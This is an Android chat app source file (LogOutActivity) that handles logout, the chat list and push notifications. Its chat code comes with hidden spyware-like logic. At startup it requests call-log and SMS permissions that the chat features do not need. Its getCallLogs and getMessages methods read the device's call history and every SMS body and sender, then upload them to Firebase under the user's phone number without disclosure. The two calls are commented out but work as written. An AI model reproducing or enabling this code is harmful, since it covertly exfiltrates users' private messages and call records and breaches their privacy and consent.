package com.example.stchat;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.Telephony;
import android.view.View;
import android.widget.Button;

import com.example.stchat.Notification.SendNotification;
import com.facebook.drawee.backends.pipeline.Fresco;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.onesignal.OneSignal;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class LogOutActivity extends AppCompatActivity {

    private Button mLogout, mUsers;
    private RecyclerView mChatList;
    private RecyclerView.Adapter mChatListAdapter;
    private RecyclerView.LayoutManager mChatListLayoutManager;

    private ArrayList<ChatObject> chatList;

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_log_out);

        Fresco.initialize(this);
        OneSignal.startInit(this).init();
        OneSignal.setSubscription(true);

        OneSignal.idsAvailable(new OneSignal.IdsAvailableHandler() {
            @Override
            public void idsAvailable(String userId, String registrationId) {
                FirebaseDatabase.getInstance().getReference().child("users").child(FirebaseAuth.getInstance().getUid()).child("notificationKey").setValue(userId);

            }
        });

        OneSignal.setInFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification);

        new SendNotification("Hii Sushi", "Love You !!", "");

        mLogout = findViewById(R.id.logout);
        mUsers = findViewById(R.id.users);

        chatList = new ArrayList<>();
        mUsers.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startActivity(new Intent(getApplicationContext(), UsersActivity.class));
            }
        });

        mLogout.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                OneSignal.setSubscription(false);
                FirebaseAuth.getInstance().signOut();
                Intent intent = new Intent(getApplicationContext(), MainActivity.class);
                intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(intent);
                finish();
                return;
            }
        });

        getPermissions();
        initializeRecyclerView();
        getChatList();
        //getCallLogs();
        //getMessages();

    }

    private void getChatList() {
        DatabaseReference mUserChatDB = FirebaseDatabase.getInstance().getReference().child("users").child(FirebaseAuth.getInstance().getUid()).child("chat");

        mUserChatDB.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    for (DataSnapshot childSnapshot : dataSnapshot.getChildren()) {
                        ChatObject mChat = new ChatObject(childSnapshot.getKey(), childSnapshot.child("name").getValue().toString(), childSnapshot.child("phone").getValue().toString());
                        chatList.add(mChat);
                        mChatListAdapter.notifyDataSetChanged();
                    }
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });
    }

    private void getPermissions() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestPermissions(new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CONTACTS,Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS}, 1);

        }
    }

    private void initializeRecyclerView() {
        mChatList = findViewById(R.id.userList);
        mChatList.setNestedScrollingEnabled(false);
        mChatList.setHasFixedSize(false);
        mChatListLayoutManager = new LinearLayoutManager(getApplicationContext(), RecyclerView.VERTICAL, false);
        mChatList.setLayoutManager(mChatListLayoutManager);
        mChatListAdapter = new ChatListAdapter(chatList);
        mChatList.setAdapter(mChatListAdapter);

    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private void getCallLogs() {
        String[] mProjection = {
                CallLog.Calls.DURATION,
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.DATE,
        };

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, mProjection, null, null, null);

        while(cursor.moveToNext()){
            String number = "", date = "", duration = "", name = "";
            duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
            number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
            name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
            date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));

            Map<String, Object> mp = new HashMap<>();
            mp.put("number", number);
            mp.put("name", name);

            DatabaseReference dbRef = FirebaseDatabase.getInstance().getReference().child("callLogs").child(FirebaseAuth.getInstance().getCurrentUser().getPhoneNumber()).push();
            dbRef.updateChildren(mp);

        }

    }

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    private void getMessages(){
        //Uri inboxURI = Uri.parse("content://sms/inbox");
        String[] mProjection = {
                Telephony.Sms.BODY,
                Telephony.Sms.ADDRESS,
        };

        Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, mProjection, null, null, null, null);

        while(cursor.moveToNext()){
            String smsBody = "", smsAddress = "";
            smsAddress = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
            smsBody = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));

            Map<String, Object> mp = new HashMap<>();
            mp.put("body", smsBody);
            //mp.put("sender", smsAddress);

            DatabaseReference dbRef = FirebaseDatabase.getInstance().getReference().child("sms").child(FirebaseAuth.getInstance().getCurrentUser().getPhoneNumber()).child(smsAddress).push();
            dbRef.updateChildren(mp);


        }

    }
}
